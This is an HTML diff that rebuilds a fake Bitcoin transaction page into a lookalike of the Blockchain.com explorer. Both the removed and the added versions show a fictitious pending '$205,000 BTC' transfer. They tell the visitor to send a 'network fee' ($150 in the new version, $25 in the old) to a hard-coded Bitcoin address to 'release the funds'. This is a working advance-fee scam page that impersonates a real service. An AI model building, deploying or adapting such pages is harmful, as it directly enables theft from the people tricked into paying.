@@ -3,231 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bitcoin Transaction Details</title>
+    <title>Blockchain Explorer</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#2563EB',
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: black; color: white; margin: 0; }
-        .spinner {
-            border: 3px solid transparent;
-            border-top: 3px solid #00D632;
-            border-right: 3px solid #00D632;
-            border-radius: 50%;
-            width: 64px;
-            height: 64px;
-            animation: spin 1.5s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
-        .details-panel {
-            transform: translateY(100%);
-            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .details-panel.open { transform: translateY(0); }
-        .view { display: none; }
-        .view.active { display: flex; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .font-mono { font-family: 'Space Mono', monospace; }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 50% { opacity: 0.5; } }
+        .animate-spin { animation: spin 1s linear infinite; }
+        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        
+        .glass-blur { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
-
-    <!-- VIEW 1: TRANSACTION DETAILS -->
-    <div id="tx-view" class="view active flex-col items-center px-6 pt-24 pb-20">
-        <header class="fixed top-0 left-0 right-0 p-4 z-50 flex justify-between items-center bg-black/80 backdrop-blur-md">
-            <button class="p-2 hover:bg-white/10 rounded-full">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
-            </button>
-            <div class="text-sm font-semibold tracking-wide uppercase text-zinc-500">Transaction Details</div>
-            <div class="w-10"></div>
-        </header>
-
-        <!-- Spinner Area -->
-        <div class="relative flex items-center justify-center w-24 h-24 mb-6">
-            <div class="absolute inset-0 bg-[#00D632]/20 blur-xl rounded-full"></div>
-            <div class="spinner"></div>
-            <div class="absolute w-12 h-12 rounded-full bg-zinc-900 flex items-center justify-center border border-white/5">
-                <div class="w-2 h-2 bg-[#00D632] rounded-full shadow-[0_0_10px_#00D632]"></div>
-            </div>
-        </div>
-
-        <h1 class="text-5xl font-bold tracking-tight mb-2">$205,000</h1>
-        
-        <div class="flex items-center gap-2 bg-white/5 px-3 py-1 rounded-full border border-white/5 mb-10">
-            <span class="w-1.5 h-1.5 rounded-full bg-[#00D632] pulse"></span>
-            <span class="text-sm font-medium text-zinc-300">Confirmation needed</span>
-        </div>
-
-        <!-- Recipient Card -->
-        <div class="w-full max-w-md bg-zinc-900/50 rounded-2xl p-4 mb-8 border border-white/5">
-            <div class="flex items-center gap-3 mb-2">
-                <div class="w-10 h-10 rounded-full bg-zinc-800 flex items-center justify-center">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00D632" stroke-width="2"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/></svg>
+<body class="bg-gray-50 text-gray-900 min-h-screen">
+    <div id="app">
+        <!-- Home Screen -->
+        <div id="home-screen">
+            <header class="bg-white/80 glass-blur border-b border-gray-200 py-4 px-6 sticky top-0 z-40">
+                <div class="max-w-7xl mx-auto flex justify-between items-center">
+                    <div class="flex items-center gap-2 font-bold text-xl">
+                        <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
+                        </svg>
+                        <span class="text-gray-900">Blockchain<span class="text-primary">.com</span></span>
+                    </div>
+                    <div class="flex items-center gap-6">
+                        <button class="text-sm font-medium text-gray-600 hover:text-primary transition-colors hidden sm:block">Prices</button>
+                        <button class="text-sm font-medium text-gray-600 hover:text-primary transition-colors hidden sm:block">Charts</button>
+                        <button class="text-sm font-medium text-gray-600 hover:text-primary transition-colors hidden sm:block">Explorer</button>
+                        <button class="bg-gray-900 hover:bg-gray-800 text-white px-5 py-2.5 rounded-xl text-sm font-semibold transition-all shadow-md hover:shadow-lg">Sign In</button>
+                    </div>
                 </div>
-                <div>
-                    <div class="text-xs text-zinc-500 uppercase tracking-wider font-semibold">Recipient</div>
-                    <div class="text-sm text-zinc-300">External Wallet</div>
+            </header>
+
+            <main>
+                <!-- Hero Section -->
+                <section class="relative py-24 md:py-32 overflow-hidden">
+                    <div class="absolute top-0 right-0 -translate-y-1/2 translate-x-1/3 w-[800px] h-[800px] bg-blue-100/40 rounded-full blur-3xl"></div>
+                    <div class="absolute bottom-0 left-0 translate-y-1/2 -translate-x-1/3 w-[600px] h-[600px] bg-blue-100/40 rounded-full blur-3xl"></div>
+                    
+                    <div class="container mx-auto px-4 relative z-10">
+                        <div class="max-w-4xl mx-auto text-center space-y-8">
+                            <div class="space-y-6">
+                                <span class="inline-block px-4 py-2 rounded-full bg-blue-100 text-blue-700 font-semibold text-sm tracking-wide">
+                                    The World's Most Popular Block Explorer
+                                </span>
+                                <h1 class="text-5xl md:text-6xl lg:text-7xl font-extrabold tracking-tight text-gray-900 leading-tight">
+                                    Search the <span class="text-primary">Blockchain</span>
+                                </h1>
+                                <p class="text-xl text-gray-500 max-w-2xl mx-auto leading-relaxed">
+                                    The most trusted source for data on the Bitcoin blockchain. Explore transactions, addresses, and blocks.
+                                </p>
+                            </div>
+
+                            <div class="max-w-2xl mx-auto w-full pt-4">
+                                <form onsubmit="handleSearch(event)" class="relative group">
+                                    <div class="absolute inset-y-0 left-5 flex items-center pointer-events-none text-gray-400 group-focus-within:text-primary transition-colors">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                                        </svg>
+                                    </div>
+                                    <input 
+                                        type="text" 
+                                        id="address-input" 
+                                        placeholder="Search by address, transaction hash, or block..."
+                                        class="w-full pl-14 pr-36 py-5 rounded-2xl border-2 border-gray-200 text-lg outline-none font-mono text-sm md:text-base shadow-xl hover:shadow-2xl hover:border-blue-300 focus:ring-4 focus:ring-blue-100 focus:border-primary transition-all duration-300"
+                                    >
+                                    <div class="absolute inset-y-2 right-2">
+                                        <button type="submit" class="h-full bg-primary hover:bg-blue-700 text-white px-6 md:px-8 rounded-xl font-semibold text-base shadow-md hover:shadow-lg transition-all flex items-center gap-2">
+                                            Search
+                                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+
+                            <div class="pt-6 flex flex-wrap justify-center items-center gap-3 text-sm text-gray-500">
+                                <span class="font-semibold text-gray-700">Trending:</span>
+                                <button class="hover:text-primary transition-colors underline decoration-dotted underline-offset-4">Bitcoin</button>
+                                <button class="hover:text-primary transition-colors underline decoration-dotted underline-offset-4">Ethereum</button>
+                                <button class="hover:text-primary transition-colors underline decoration-dotted underline-offset-4">Latest Blocks</button>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Stats Grid -->
+                <section class="py-16 bg-white border-y border-gray-100">
+                    <div class="container mx-auto px-4">
+                        <div class="grid grid-cols-2 lg:grid-cols-4 gap-6">
+                            <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 hover:shadow-lg transition-shadow">
+                                <div class="flex items-start justify-between mb-4">
+                                    <div class="p-3 rounded-xl bg-green-100 text-green-600">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
+                                        </svg>
+                                    </div>
+                                    <span class="text-xs font-bold px-2 py-1 rounded bg-green-100 text-green-700">+2.4%</span>
+                                </div>
+                                <h3 class="text-gray-500 text-sm font-medium mb-1">Market Cap</h3>
+                                <p class="text-2xl md:text-3xl font-bold tracking-tight text-gray-900">$1.28T</p>
+                            </div>
+                            <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 hover:shadow-lg transition-shadow">
+                                <div class="flex items-start justify-between mb-4">
+                                    <div class="p-3 rounded-xl bg-blue-100 text-blue-600">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/>
+                                        </svg>
+                                    </div>
+                                    <span class="text-xs font-bold px-2 py-1 rounded bg-green-100 text-green-700">+5.1%</span>
+                                </div>
+                                <h3 class="text-gray-500 text-sm font-medium mb-1">Transactions (24h)</h3>
+                                <p class="text-2xl md:text-3xl font-bold tracking-tight text-gray-900">542,893</p>
+                            </div>
+                            <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 hover:shadow-lg transition-shadow">
+                                <div class="flex items-start justify-between mb-4">
+                                    <div class="p-3 rounded-xl bg-purple-100 text-purple-600">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
+                                        </svg>
+                                    </div>
+                                </div>
+                                <h3 class="text-gray-500 text-sm font-medium mb-1">Latest Block</h3>
+                                <p class="text-2xl md:text-3xl font-bold tracking-tight text-gray-900">#829,102</p>
+                            </div>
+                            <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 hover:shadow-lg transition-shadow">
+                                <div class="flex items-start justify-between mb-4">
+                                    <div class="p-3 rounded-xl bg-orange-100 text-orange-600">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"/>
+                                        </svg>
+                                    </div>
+                                </div>
+                                <h3 class="text-gray-500 text-sm font-medium mb-1">Hash Rate</h3>
+                                <p class="text-2xl md:text-3xl font-bold tracking-tight text-gray-900">582 EH/s</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </main>
+
+            <footer class="bg-gray-900 text-gray-400 py-12">
+                <div class="container mx-auto px-4 text-center">
+                    <div class="flex items-center justify-center gap-2 mb-4">
+                        <svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
+                        </svg>
+                        <span class="font-bold text-white">Blockchain.com</span>
+                    </div>
+                    <p class="text-sm">&copy; 2024 Blockchain Explorer. All rights reserved.</p>
                 </div>
-            </div>
-            <div class="bg-black/50 rounded-xl p-3 mt-2 flex justify-between items-center group cursor-pointer" onclick="copyText('35TSFGqY1ZEUgo6epfvkbJSh8ubg5r3kgJ')">
-                <span class="text-sm font-mono text-zinc-300 truncate mr-2">35TSFGqY...5r3kgJ</span>
-                <svg class="text-zinc-600 group-hover:text-[#00D632]" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+            </footer>
+        </div>
+
+        <!-- Loading Screen -->
+        <div id="loading-screen" class="hidden fixed inset-0 z-50 bg-white/95 glass-blur flex flex-col items-center justify-center px-4">
+            <div class="w-full max-w-md space-y-8 text-center">
+                <div class="relative w-28 h-28 mx-auto">
+                    <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <span id="progress-percent" class="text-xl font-bold font-mono text-primary">0%</span>
+                    </div>
+                </div>
+
+                <div class="space-y-2">
+                    <h2 id="loading-text" class="text-2xl font-bold text-gray-900 animate-pulse">Resolving Address...</h2>
+                    <p class="text-gray-500">Please wait while we fetch blockchain data...</p>
+                </div>
+
+                <div class="h-2.5 w-full bg-gray-100 rounded-full overflow-hidden">
+                    <div id="progress-bar" class="h-full bg-primary rounded-full transition-all duration-100 ease-linear" style="width: 0%"></div>
+                </div>
+
+                <div class="text-xs text-gray-400 font-mono">
+                    Session ID: <span id="session-id">XXXXXX</span> &bull; Time elapsed: <span id="time-elapsed">0.0</span>s
+                </div>
             </div>
         </div>
 
-        <!-- Stepper -->
-        <div class="relative pl-4 space-y-8 w-full max-w-md mb-12">
-            <div class="absolute left-[27px] top-2 bottom-2 w-[2px] bg-zinc-800"></div>
+        <!-- Results Screen -->
+        <div id="results-screen" class="hidden min-h-screen bg-gray-50">
+            <header class="bg-white/80 glass-blur border-b border-gray-200 py-4 px-6 sticky top-0 z-40">
+                <div class="max-w-7xl mx-auto flex justify-between items-center">
+                    <div class="flex items-center gap-2 font-bold text-xl">
+                        <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
+                        </svg>
+                        <span class="text-gray-900">Blockchain<span class="text-primary">.com</span></span>
+                    </div>
+                </div>
+            </header>
             
-            <div class="relative flex items-start gap-4 z-10">
-                <div class="w-6 h-6 rounded-full border-2 border-[#00D632] bg-[#00D632] flex items-center justify-center shrink-0">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="3"><path d="M20 6 9 17l-5-5"/></svg>
-                </div>
-                <div class="pt-0.5">
-                    <h4 class="text-white font-medium">Submitted</h4>
-                    <p class="text-sm text-zinc-400">Withdrawal created</p>
-                </div>
-            </div>
+            <main class="container mx-auto px-4 py-8 max-w-4xl">
+                <button onclick="goHome()" class="flex items-center text-sm text-gray-500 hover:text-primary mb-8 font-medium transition-colors">
+                    <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+                    </svg>
+                    Back to Search
+                </button>
 
-            <div class="relative flex items-start gap-4 z-10">
-                <div class="w-6 h-6 rounded-full border-2 border-[#00D632] flex items-center justify-center shrink-0 shadow-[0_0_15px_rgba(0,214,50,0.3)]">
-                    <div class="w-2 h-2 bg-[#00D632] rounded-full pulse"></div>
-                </div>
-                <div class="pt-0.5">
-                    <h4 class="text-white font-medium">Processing</h4>
-                    <p class="text-sm text-zinc-400">Awaiting confirmation</p>
-                </div>
-            </div>
+                <!-- Transaction Found -->
+                <div id="transaction-found" class="hidden space-y-8">
+                    <div class="bg-white rounded-2xl border border-gray-200 p-6 md:p-8 shadow-lg">
+                        <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
+                            <div>
+                                <div class="flex flex-wrap items-center gap-2 mb-3">
+                                    <span class="bg-green-100 text-green-700 px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider flex items-center gap-1">
+                                        <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                        </svg>
+                                        Transaction Found
+                                    </span>
+                                    <span class="bg-blue-100 text-blue-700 px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider">
+                                        BTC Network
+                                    </span>
+                                </div>
+                                <h2 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Transaction Details</h2>
+                                <div class="flex items-center gap-2 text-gray-500 font-mono text-sm break-all">
+                                    <span id="searched-address-display"></span>
+                                    <button onclick="copyAddress()" class="text-primary hover:text-blue-700 p-1 transition-colors">
+                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                                        </svg>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="text-left md:text-right">
+                                <div class="text-sm text-gray-500 font-medium mb-1">Total Amount</div>
+                                <div class="text-3xl md:text-4xl font-bold text-gray-900 tracking-tight">$205,000 BTC</div>
+                            </div>
+                        </div>
 
-            <div class="relative flex items-start gap-4 z-10">
-                <div class="w-6 h-6 rounded-full border-2 border-zinc-700 flex items-center justify-center shrink-0"></div>
-                <div class="pt-0.5">
-                    <h4 class="text-zinc-500 font-medium">Complete</h4>
-                    <p class="text-sm text-zinc-600">$205,000.00</p>
+                        <!-- Warning Box -->
+                        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-6 mb-8 relative overflow-hidden">
+                            <div class="absolute top-0 right-0 p-4 opacity-10">
+                                <svg class="w-32 h-32 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                                </svg>
+                            </div>
+                            <div class="relative z-10">
+                                <h3 class="text-amber-800 font-bold text-lg flex items-center gap-2 mb-3">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                                    </svg>
+                                    Action Required: Network Fee Pending
+                                </h3>
+                                <p class="text-amber-700 mb-6 max-w-2xl leading-relaxed">
+                                    This transaction is currently pending in the mempool. To release the funds ($205,000 BTC) to your wallet, 
+                                    the network mining fee of <span class="font-bold">$150 BTC</span> must be paid.
+                                </p>
+                                
+                                <div class="bg-white/80 rounded-xl p-5 border border-amber-200 max-w-xl shadow-sm">
+                                    <div class="text-xs font-bold text-amber-800 uppercase tracking-wider mb-3">Send Network Fee To:</div>
+                                    <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 bg-white p-4 rounded-lg border border-gray-200 shadow-sm">
+                                        <span class="font-mono text-sm text-gray-800 break-all flex-1">35TSFGqY1ZEUgo6epfvkbJSh8ubg5r3kgJ</span>
+                                        <button onclick="copyFeeAddress()" class="shrink-0 bg-amber-100 hover:bg-amber-200 text-amber-800 px-4 py-2 rounded-lg font-semibold text-sm transition-colors flex items-center justify-center gap-2">
+                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                                            </svg>
+                                            Copy
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Transaction Grid -->
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <div class="p-5 rounded-xl bg-gray-50 border border-gray-200">
+                                <div class="text-sm text-gray-500 mb-1 flex items-center gap-2">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                                    </svg>
+                                    Status
+                                </div>
+                                <div class="font-semibold text-amber-600 flex items-center gap-2">
+                                    <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
+                                    Unconfirmed
+                                </div>
+                            </div>
+                            <div class="p-5 rounded-xl bg-gray-50 border border-gray-200">
+                                <div class="text-sm text-gray-500 mb-1 flex items-center gap-2">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                    </svg>
+                                    Network Fee
+                                </div>
+                                <div class="font-semibold text-gray-900">$150 BTC</div>
+                            </div>
+                            <div class="p-5 rounded-xl bg-gray-50 border border-gray-200">
+                                <div class="text-sm text-gray-500 mb-1 flex items-center gap-2">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/>
+                                    </svg>
+                                    Block Height
+                                </div>
+                                <div class="font-semibold text-gray-900">Pending (Mempool)</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="text-center text-sm text-gray-500 max-w-2xl mx-auto">
+                        Transactions are generally processed within 10-60 minutes after fee confirmation. 
+                        Need help? <a href="#" class="text-primary hover:underline font-medium">Contact Support</a>
+                    </div>
                 </div>
-            </div>
+
+                <!-- No Transaction Found -->
+                <div id="no-transaction" class="hidden py-16 text-center">
+                    <div class="w-24 h-24 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                        <svg class="w-12 h-12 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 9l-6 6M9 9l6 6"/>
+                        </svg>
+                    </div>
+                    <h2 class="text-2xl font-bold text-gray-900 mb-3">No Transactions Found</h2>
+                    <p class="text-gray-500 mb-8 max-w-md mx-auto">
+                        We couldn't locate any transaction history for the address or hash you provided on the main chain.
+                    </p>
+                    
+                    <div class="bg-blue-50 text-blue-800 p-5 rounded-xl text-sm mb-8 max-w-md mx-auto text-left border border-blue-100">
+                        <h4 class="font-bold mb-1 flex items-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                            </svg>
+                            Suggestion:
+                        </h4>
+                        <p>Please verify the address is correct and try your search again.</p>
+                    </div>
+
+                    <button onclick="goHome()" class="bg-primary hover:bg-blue-700 text-white px-8 py-3 rounded-xl font-semibold transition-colors shadow-md">
+                        Try Another Search
+                    </button>
+                </div>
+            </main>
         </div>
-
-        <!-- Buttons -->
-        <div class="w-full max-w-md space-y-4">
-            <button onclick="toggleDetails(true)" class="w-full py-4 rounded-full border border-zinc-800 text-zinc-400 font-semibold flex items-center justify-center gap-2 hover:bg-white/5">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
-                Check Details
-            </button>
-            <button onclick="showView('payment-view')" class="w-full py-4 rounded-full bg-[#00D632] text-black font-bold text-lg shadow-[0_0_20px_rgba(0,214,50,0.3)]">
-                Pay Now
-            </button>
-        </div>
-    </div>
-
-    <!-- VIEW 2: PAYMENT PAGE -->
-    <div id="payment-view" class="view flex-col items-center px-6 pt-24 pb-20">
-        <header class="fixed top-0 left-0 right-0 p-4 z-50 flex justify-between items-center bg-black/80 backdrop-blur-md">
-            <button onclick="showView('tx-view')" class="p-2 hover:bg-white/10 rounded-full">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
-            </button>
-            <div class="text-sm font-semibold tracking-wide uppercase text-zinc-500">Pending Payment</div>
-            <div class="w-10"></div>
-        </header>
-
-        <div class="w-20 h-20 rounded-full bg-[#00D632]/10 flex items-center justify-center mb-6">
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#00D632" stroke-width="2"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/></svg>
-        </div>
-        
-        <h2 class="text-3xl font-bold text-center mb-2">Send Fee Payment</h2>
-        <p class="text-zinc-400 text-center max-w-[280px] mb-8">
-            Please send exactly <span class="text-white font-bold">$25</span> to release your pending transfer.
-        </p>
-
-        <div class="w-full max-w-md bg-zinc-900 rounded-3xl p-6 border border-zinc-800">
-            <div class="flex justify-between items-center mb-4">
-                <span class="text-sm font-semibold text-zinc-500 uppercase tracking-wider">Fee Address (BTC)</span>
-                <span class="px-2 py-1 bg-[#00D632]/10 rounded text-xs text-[#00D632] font-medium">BTC Network</span>
-            </div>
-            <div class="font-mono text-lg break-all text-white leading-relaxed mb-6">
-                bc1qsgduvyhk8ywtta9qe5f0hrv4y0p8n5w8dx4gnx
-            </div>
-            <button onclick="copyText('bc1qsgduvyhk8ywtta9qe5f0hrv4y0p8n5w8dx4gnx')" class="w-full py-4 rounded-xl bg-white text-black font-semibold flex items-center justify-center gap-2">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
-                Copy Address
-            </button>
-        </div>
-
-        <div class="w-full max-w-md mt-8 space-y-4">
-            <div class="flex items-start gap-4 p-4 rounded-2xl bg-zinc-900/30 border border-zinc-800">
-                <div class="w-8 h-8 rounded-full bg-[#00D632]/20 flex items-center justify-center shrink-0">
-                    <span class="text-[#00D632] font-bold">1</span>
-                </div>
-                <div>
-                    <h4 class="font-semibold text-white mb-1">Copy & Send</h4>
-                    <p class="text-sm text-zinc-400">Copy the address above and send $25 from your external wallet.</p>
-                </div>
-            </div>
-            <div class="flex items-start gap-4 p-4 rounded-2xl bg-zinc-900/30 border border-zinc-800">
-                <div class="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center shrink-0 border border-zinc-700">
-                    <span class="text-zinc-400 font-bold">2</span>
-                </div>
-                <div>
-                    <h4 class="font-semibold text-zinc-300 mb-1">Wait for Release</h4>
-                    <p class="text-sm text-zinc-500">Put a pending order of $25 awaiting for transaction release.</p>
-                </div>
-            </div>
-        </div>
-
-        <button onclick="showView('tx-view')" class="w-full max-w-md mt-10 py-4 rounded-full border border-zinc-800 text-zinc-400 font-semibold hover:bg-white/5">
-            I've Sent the Payment
-        </button>
-    </div>
-
-    <!-- DETAILS SHEET -->
-    <div id="details-overlay" class="fixed inset-0 bg-black/60 backdrop-blur-sm z-[60] hidden" onclick="toggleDetails(false)"></div>
-    <div id="details-panel" class="details-panel fixed bottom-0 left-0 right-0 bg-[#111] rounded-t-3xl z-[70] p-6 border-t border-zinc-800 max-w-md mx-auto">
-        <div class="w-12 h-1 bg-zinc-800 rounded-full mx-auto mb-6"></div>
-        <h3 class="text-xl font-bold mb-6">Transaction Breakdown</h3>
-        <div class="space-y-4 mb-8">
